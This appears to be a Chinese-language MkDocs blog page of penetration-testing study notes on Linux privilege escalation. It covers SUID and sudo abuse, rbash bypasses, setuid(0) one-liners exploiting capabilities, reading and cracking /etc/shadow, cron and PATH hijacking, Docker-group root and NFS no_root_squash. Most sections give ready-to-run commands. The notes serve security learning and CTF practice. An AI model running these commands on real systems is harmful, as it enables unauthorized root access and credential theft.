+    <nav class="md-nav" aria-label="可利用于提权的命令">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1nmap" class="md-nav__link">
+    1.nmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2find" class="md-nav__link">
+    2.find
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3vim" class="md-nav__link">
+    3.vim
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4bash" class="md-nav__link">
+    4.bash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5lessmore" class="md-nav__link">
+    5.less，more
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6exim" class="md-nav__link">
+    6.exim
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rbash" class="md-nav__link">
+    rbash 绕过
+  </a>
+  
+    <nav class="md-nav" aria-label="rbash 绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rbash_1" class="md-nav__link">
+    何为rbash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass" class="md-nav__link">
+    bypass
+  </a>
+  
+    <nav class="md-nav" aria-label="bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scp-bypass" class="md-nav__link">
+    scp bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell-bypass" class="md-nav__link">
+    进入命令自带shell bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-bypasss" class="md-nav__link">
+    find bypasss
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass_1" class="md-nav__link">
+    编程语言 bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cp-bypass" class="md-nav__link">
+    cp bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pathshell" class="md-nav__link">
+    直接更改PATH/SHELL变量
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh-bypass" class="md-nav__link">
+    ssh bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    内核提权
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#passwdshadow" class="md-nav__link">
+    passwd和shadow
+  </a>
+  
+    <nav class="md-nav" aria-label="passwd和shadow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    明文密码
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#passwd" class="md-nav__link">
+    passwd 可写
+  </a>
+  
+    <nav class="md-nav" aria-label="passwd 可写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shadow" class="md-nav__link">
+    爆破shadow
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    计划任务
+  </a>
+  
+    <nav class="md-nav" aria-label="计划任务">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    文件重写
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    环境变量劫持
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    通配符提权
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    环境变量
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    密码查找
+  </a>
+  
+    <nav class="md-nav" aria-label="密码查找">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    文件内查找
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    查找十分钟内更改过的文件
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#capabilities" class="md-nav__link">
+    capabilities
+  </a>
+  
+    <nav class="md-nav" aria-label="capabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    简介
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    实操
+  </a>
+  
+    <nav class="md-nav" aria-label="实操">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cap_setuid" class="md-nav__link">
+    通过cap_setuid
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cap_dac_read_search" class="md-nav__link">
+    通过CAP_DAC_READ_SEARCH
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docker" class="md-nav__link">
+    Docker
+  </a>
+  
+    <nav class="md-nav" aria-label="Docker">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#docker_1" class="md-nav__link">
+    Docker用户组提权
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nfs" class="md-nav__link">
+    NFS
+  </a>
+  
+    <nav class="md-nav" aria-label="NFS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#no_root_squash" class="md-nav__link">
+    no_root_squash
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="linux">Linux提权总结</h1>
+<hr />
+<hr />
+<h2 id="sudo-suid">sudo 和 suid 提权</h2>
+<h3 id="suid">何为suid</h3>
+<p><img alt="QQ截图20210217145316" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145316.png" title="QQ截图20210217145316" /></p>
+<p>可见在权限位置有一个s权限。那么这个s的作用是什么呢？
+答案是当其他用户执行该文件时，该文件会以root的身份执行。
+这里就涉及到了Effective UID和Real UID以及Saved UID
+Effective UID: 程序实际操作时生效的UID
+Real UID: 执行该程序的用户的实际UID
+Saved UID: 在高权限用户降权后，保留的其原本UID (不展开说)</p>
+<p>所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID</p>
+<h3 id="sudo">何为sudo</h3>
+<p>就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令</p>
+<h3 id="suid_1">遍历目录中的suid文件</h3>
+<pre><code class="language-纯文本">find / -perm -u=s 2&gt;/dev/null
+</code></pre>
+<p>执行该命令，会得到所有suid文件</p>
+<p><img alt="QQ截图20210217145327" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145327.png" title="QQ截图20210217145327" /></p>
+<h3 id="sudo-l-sudo">用sudo -l 查看哪些命令能被sudo</h3>
+<h3 id="_1">可利用于提权的命令</h3>
+<h4 id="1nmap">1.nmap</h4>
+<pre><code class="language-纯文本">nmap --interactive
+</code></pre>
+<p>使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权</p>
+<pre><code class="language-纯文本">echo &quot;os.execute('/bin/bash')&quot; &gt; ./shell
+nmap --script=shell
+</code></pre>
+<p>全版本通杀提权，利用nmap可以执行指定文件的特点提权</p>
+<h4 id="2find">2.find</h4>
+<pre><code class="language-纯文本">find / -exec command
+</code></pre>
+<p>find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root.</p>
+<pre><code class="language-纯文本">读文件 find /path -exec {} \;
+</code></pre>
+<h4 id="3vim">3.vim</h4>
+<p>vim有了suid就可以任意文件读取了</p>
+<p>同时也可以输入 :shell</p>
+<p>来获取root shell</p>
+<h4 id="4bash">4.bash</h4>
+<pre><code class="language-纯文本">bash -p  开启一个新shell，suid的话自然是开启root shell
+</code></pre>
+<h4 id="5lessmore">5.less，more</h4>
+<p>和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root</p>
+<h4 id="6exim">6.exim</h4>
+<p>exim在特定版本下会有suid提权</p>
+<p><img alt="QQ截图20210217145341" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145341.png" title="QQ截图20210217145341" /></p>
+<p>下载exp打就完事了</p>
+<h2 id="rbash">rbash 绕过</h2>
+<h3 id="rbash_1">何为rbash</h3>
+<p>rbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下.</p>
+<ul>
+<li>cd 切换目录</li>
+<li>含有斜杠 <code>/</code> 的命令, 譬如 <code>/bin/sh</code></li>
+<li>设置 PATH ENV 等环境变量</li>
+<li>使用 <code>&gt;</code> <code>&lt;</code> 进行重定向</li>
+<li>binary 的运行. 通常 root 用户会手动创建 <code>/bin/binary_file -&gt; /home/rbash_user/bin/binary_file</code> 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 <code>echo $SHELL</code>, 可以获取当前环境是否是 rbash.</li>
+</ul>
+<h3 id="bypass">bypass</h3>
+<h4 id="scp-bypass">scp bypass</h4>
+<p>我在<a href="http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的" title="http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的">http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的</a></p>
+<p><img alt="QQ截图20210217145419" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145419.png" title="QQ截图20210217145419" /></p>
+<h4 id="shell-bypass">进入命令自带shell bypass</h4>
+<p>man,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可
+一般都是在shell键入!/bin/sh来bypass rbash</p>
+<p>下面这种方法也是可行的（似乎仅vim)</p>
+<pre><code class="language-纯文本">:set shell=/bin/bash
+:shell
+</code></pre>
+<p>执行上面两个语句，就bypass了</p>
+<h4 id="find-bypasss">find bypasss</h4>
+<p>简单概括就是-exec执行一下/bin/bash …</p>
+<p><img alt="QQ截图20210217145437" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145437.png" title="QQ截图20210217145437" /></p>
+<h4 id="bypass_1">编程语言 bypass</h4>
+<p>python</p>
+<p>如果python都可以用的话，那就更轻松了，os安排一下
+似乎pty也行?没试</p>
+<pre><code class="language-纯文本">python -c &quot;import os;os.system('/bin/bash')&quot;
+</code></pre>
+<p>php</p>
+<pre><code class="language-纯文本">php -a 进入php shell
+然后执行命令:exec(&quot;/bin/bash&quot;);
+</code></pre>
+<p>perl</p>
+<pre><code class="language-纯文本">perl -e 'exec &quot;/bin/sh&quot;;'
+</code></pre>
+<p>ruby</p>
+<pre><code class="language-纯文本">ruby -e 'exec &quot;/bin/bash&quot;'
+</code></pre>
+<h4 id="cp-bypass">cp bypass</h4>
+<p>直接用cp把/usr/bin里的命令复制过来就行了</p>
+<h4 id="pathshell">直接更改PATH/SHELL变量</h4>
+<p>键入export -p 查看该用户的变量</p>
+<p><img alt="QQ截图20210217145455" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145455.png" title="QQ截图20210217145455" /></p>
+<p>如果这俩变量有w权，那么我们可以直接写入来bypass</p>
+<h4 id="ssh-bypass">ssh bypass</h4>
+<p>原理是通过ssh链接当前IP的当前用户并启动/bin/bash</p>
+<pre><code class="language-纯文本">ssh username@Ip -t &quot;/bin/bash&quot;
+</code></pre>
+<h2 id="_2">内核提权</h2>
+<p>用 uanme -a 查明内核版本</p>
+<p><img alt="image-20210311220036263" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210311220036263.png" title="image-20210311220036263" /></p>
+<p>然后找exp打就完事了，内核提权的内容有点底层，暂时不用深入了解</p>
+<h2 id="passwdshadow">passwd和shadow</h2>
+<h3 id="_3">明文密码</h3>
+<p>/etc/passwd 默认所有用户可读，但只有root可写。
+/etc/passwd里的用户口令往往以x代替，其加密后的密码会存入/etc/shadow里面，/etc/shadow默认只有root可读。</p>
+<p>但是有小概率情况，明文密码就直接出现在/etc/passwd了，如果有这个情况且root密码暴露在了passwd里，那么就可以轻而易举提权了</p>
+<h2 id="passwd">passwd 可写</h2>
+<p>如果/etc/passwd 我们当前用户可写，可以直接把root的密码改成一个明文密码，从而达到提权目的</p>
+<h3 id="shadow">爆破shadow</h3>
+<p>如果/etc/shadow 可读，我们可以用hashcat或者john暴力破解shadow文件</p>
+<h2 id="_4">计划任务</h2>
+<h3 id="_5">文件重写</h3>
+<p>计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但我们可以列出/etc的系统任务，系统任务默认是root权限运行的</p>
+<pre><code class="language-纯文本">ls -l /etc/cron*
+</code></pre>
+<p>如果我们有幸有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹shell等指令，从而提权</p>
+<h3 id="_6">环境变量劫持</h3>
+<p>我们查看定时任务</p>
+<p><img alt="image-20210316125520822" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316125520822.png" title="image-20210316125520822" /></p>
+<p>发现定义了诸多环境变量，如果其任务有未指定绝对路径的指令，如</p>
+<pre><code class="language-纯文本">17 *    * * *   root    shell.sh
+</code></pre>
+<p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持</p>
+<p>比如我们在/sbin 写入一个 反弹shell功能的shell.sh，那么就可以造成提权</p>
+<h2 id="_7">通配符提权</h2>
+<p><a href="https://www.secpulse.com/archives/72965.html" title="https://www.secpulse.com/archives/72965.html">https://www.secpulse.com/archives/72965.html</a> 总结的太好了，我都不想记笔记了（偷懒</p>
+<h2 id="_8">环境变量</h2>
+<p>如果我们找到一个suid权限的程序，但是我们无法完成suid提权，就可以试试搭配环境变量进行提权。</p>
+<p>这个提权方法的思想是，找到有suid的，内部有system函数调用未指定路径的命令的文件。同时用户有修改自己环境变量的权限，</p>
+<p>我们就可以通过劫持system函数里调用的脚本文件，使其指向我们环境变量里自行创建的一个同名脚本文件，那么这个我们自行创建的同名脚本文件就能以root权限运行了，如果这个脚本文件里的命令是/bin/bash，那么就相当于我们提权了。</p>
+<p>可能有点小绕，看下面具体操作就行了。</p>
+<p>实验室配置:</p>
+<p>首先在一个目录下创建如下文件</p>
+<pre><code class="language-纯文本">vim demo.c
+</code></pre>
+<p><img alt="image-20210312183454821" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312183454821.png" title="image-20210312183454821" /></p>
+<p>然后 gcc demo.c -o shell    将其编译为可执行文件</p>
+<p>然后 chmod u+s shell           为其增加suid权限</p>
+<p>攻击者视角:</p>
+<p>首先使用下列指令搜寻suid权限文件</p>
+<pre><code class="language-纯文本">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p><img alt="image-20210312184402084" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" title="image-20210312184402084" /></p>
+<p>发现可疑目标，执行一下看看</p>
+<p><img alt="image-20210312184424019" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" title="image-20210312184424019" /></p>
+<p>发现返回了ps命令的结果，我们可以以此猜测这个文件内部 有 system("ps");  这条c语言代码。
+遂可尝试环境变量提权</p>
+<p>我们依次执行以下命令</p>
+<pre><code class="language-纯文本">cd /tmp
+echo &quot;/bin/bash&quot; &gt; ps
+export $PATH=/tmp:$PATH        需要修改自身环境变量的权限，但基本上都有这个权限
+chmod 777 ./ps                 没这条命令会导致提权失败
+cd /home/const27
+./shell                        提权成功
+</code></pre>
+<p><img alt="image-20210312184905534" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184905534.png" title="image-20210312184905534" /></p>
+<h2 id="_9">密码查找</h2>
+<p>这个提权技术说白了，就是去到处翻密码</p>
+<h3 id="_10">文件内查找</h3>
+<pre><code class="language-纯文本">grep --color=auto -rnw '/' -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null
+find . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \;
+</code></pre>
+<p>我们可以通过以上命令，指定关键字，在所有文件中搜索内容中有关键字的文件。</p>
+<h3 id="_11">查找十分钟内更改过的文件</h3>
+<pre><code class="language-纯文本">find / -mmin -10 2&gt;/dev/null | grep -Ev &quot;^/proc&quot;  (不显示^/proc文件或文件夹)
+</code></pre>
+<h2 id="capabilities">capabilities</h2>
+<p>capabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患</p>
+<h3 id="_12">简介</h3>
+<p>capabilities 把root的权限细分了，可以分别启用或者禁用。</p>
+<p>在进行特权操作的时候，如果euid不是root，那么系统就会检查是否具有执行特权操作的对应capabilities ，并以此为凭据决定特权操作是否能被执行。</p>
+<p>如下是一些常见的特权操作及其对应capabilities</p>
+<table>
+<thead>
+<tr>
+<th>改变文件的所属者(chown())</th>
+<th>CAP_CHOWN</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>向进程发送信号(kill(), signal())</td>
+<td>CAP_KILL</td>
+</tr>
+<tr>
+<td>改变进程的uid(setuid(), setreuid(), setresuid()等)</td>
+<td>CAP_SETUID</td>
+</tr>
+<tr>
+<td>trace进程(ptrace())</td>
+<td>CAP_SYS_PTRACE</td>
+</tr>
+<tr>
+<td>设置系统时间(settimeofday(), stime()等)</td>
+<td>CAP_SYS_TIME</td>
+</tr>
+<tr>
+<td>忽略文件读及目录搜索的DAC访问限制</td>
+<td>CAP_DAC_READ_SEARCH</td>
+</tr>
+</tbody>
+</table>
+<p>关于capabilities的管理工具有如下:</p>
+<ul>
+<li>getcap</li>
+<li>setcap</li>
+<li>capsh</li>
+<li>filecap</li>
+</ul>
+<p>getcap 用于查询capabilities，setcap用于设置capabilities，capsh用于查当前shell进程的capabilities，filecap既能设置又能查询。</p>
+<p>我们可以通过以下指令搜索设置了capabilities的可执行文件</p>
+<pre><code class="language-纯文本">getcap -r / 2&gt;/dev/null
+</code></pre>
+<h3 id="_13">实操</h3>
+<h4 id="cap_setuid">通过cap_setuid</h4>
+<p>cap_setuid 可以设置当前用户的euid，我们可以通过此选项来进行一些提权。</p>
+<p>以python为例</p>
+<p><img alt="image-20210316201948608" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316201948608.png" title="image-20210316201948608" /></p>
+<p>我们发现python3.8 有cap_setuid权限，那么我们可以用以下指令进行提权</p>
+<pre><code class="language-纯文本">python -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
+</code></pre>
+<p><img alt="image-20210316202912697" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316202912697.png" title="image-20210316202912697" /></p>
+<p>类似的有很多。</p>
+<p>perl</p>
+<pre><code class="language-纯文本">perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;'
+</code></pre>
+<p>gdb</p>
+<pre><code class="language-纯文本">gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+</code></pre>
+<p>php</p>
+<pre><code class="language-纯文本">php -r &quot;posix_setuid(0); system('/bin/sh');&quot;
+</code></pre>
+<p>python</p>
+<pre><code class="language-纯文本">python -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
+</code></pre>
+<p>rvim</p>
+<p>需要支持python3模块。</p>
+<pre><code class="language-纯文本">rvim -c ':py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)'
+</code></pre>
+<p>vim</p>
+<p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p>
+<pre><code class="language-纯文本">vim -c ':py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)'
+</code></pre>
+<h4 id="cap_dac_read_search">通过CAP_DAC_READ_SEARCH</h4>
+<p>cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。</p>
+<p>利用此特性我们可以读取系统中的敏感信息。</p>
+<p>如果tar有此权限，我们可以通过此来查看敏感文件内容。</p>
+<pre><code class="language-纯文本">tar cvf shadow.tar /etc/shadow  //创建压缩文件
+
+tar -xvf shadow.tar  //解压缩
+
+cd etc  //进入解压缩的目录
+
+chmod +r shadow  //赋予读权限
+
+cat shadow | grep root  //查看shadow文件的内容
+</code></pre>
+<h2 id="docker">Docker</h2>
+<h3 id="docker_1">Docker用户组提权</h3>
+<p>如果我们拿到了一个Docker用户组的用户权限，那么我们可以很轻松地完成提权</p>
+<p>首先我们执行如下命令</p>
+<pre><code class="language-纯文本">docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh
+</code></pre>
+<p>然后在其中的/etc/passwd中写入一个root权限用户（我这里直接无密码了）</p>
+<p><img alt="image-20210316205908273" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316205908273.png" title="image-20210316205908273" /></p>
+<p>然后退出来，直接尝试 su root2</p>
+<p><img alt="image-20210316210009057" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316210009057.png" title="image-20210316210009057" /></p>
+<p>提权成功</p>
+<h2 id="nfs">NFS</h2>
+<p>NFS 是一个用来共享目录的东西，但若配置权限不当则会引发安全问题</p>
+<h3 id="no_root_squash">no_root_squash</h3>
+<p>我们cat /etc/exports 如果有no_root_squash字样，则说明root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p>
+<p>也就是说，任何机器的root在此目录上都有最高权限。</p>
+<p>我们在获得一台机器的root权限后，可以通过nfs在另一台低权限机器上实现提权</p>
+<pre><code class="language-纯文本">mkdir /tmp/nfs
+mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs 将本机上的/tmp/nfs 挂载到共享目录
+cp /bin/bash /tmp/nfs/bash
+chmod u+s /tmp/nfs/bash  设置共享目录上bash的suid
+</code></pre>
+<p>回到低权限机，执行 /tmp/bash  完成提权</p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.efa0ade1.min.js"></script>
+      
+    
+  </body>
+</html>
